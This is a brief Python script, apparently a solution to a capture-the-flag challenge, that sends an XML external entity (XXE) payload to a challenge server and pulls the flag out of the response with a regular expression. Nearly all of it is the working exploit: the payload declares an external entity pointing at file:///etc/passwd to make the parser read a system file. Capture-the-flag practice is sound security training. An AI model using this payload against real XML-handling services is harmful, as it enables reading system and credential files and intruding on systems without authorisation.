#!/usr/bin/env python3
import requests
import re

url = 'http://challs.crate.nu:16627/xml'

payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'

r = requests.post(url, files={'xml': (None, payload)})
print(re.findall(r'cratectf{.*}', r.text)[0])
